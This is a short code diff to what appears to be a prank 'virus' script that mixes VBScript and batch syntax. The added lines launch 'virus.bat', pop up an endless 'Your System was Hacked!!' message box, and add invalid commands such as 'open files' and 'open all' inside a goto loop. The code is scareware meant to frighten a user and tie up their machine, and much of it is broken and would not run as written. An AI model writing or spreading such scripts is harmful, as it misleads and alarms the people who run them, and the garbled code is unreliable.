@@ -1,3 +1,9 @@
+start virus.bat
 do
-msgbox"1487!!"
+msgbox"Your System was Hacked!!"
 loop
+open files
+open all
+goto loop
+:x
+end
